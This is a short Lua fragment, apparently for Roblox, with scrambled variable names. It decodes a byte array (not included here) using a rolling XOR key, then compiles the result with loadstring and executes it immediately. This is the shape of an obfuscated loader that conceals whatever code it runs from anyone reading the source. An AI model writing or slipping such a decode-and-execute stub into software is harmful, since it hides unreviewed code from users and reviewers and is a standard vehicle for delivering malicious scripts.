local stkoyx35,haaqiy16=12,73
local bimhvn89={}
for vmmxye44=1,#alxdyl10 do
  local kappvx40=alxdyl10[vmmxye44]
  kappvx40=bit32.bxor(kappvx40,haaqiy16)
  kappvx40=(kappvx40-stkoyx35+256)%256
  bimhvn89[vmmxye44]=kappvx40
  stkoyx35=(stkoyx35*13+7)%256;haaqiy16=(haaqiy16*17+11)%256
end
local inoxdx13=""
for vmmxye44=1,#bimhvn89 do inoxdx13=inoxdx13..string.char(bimhvn89[vmmxye44])end
local _f,_e=loadstring(inoxdx13)
if _f then _f() else warn(tostring(_e)) end
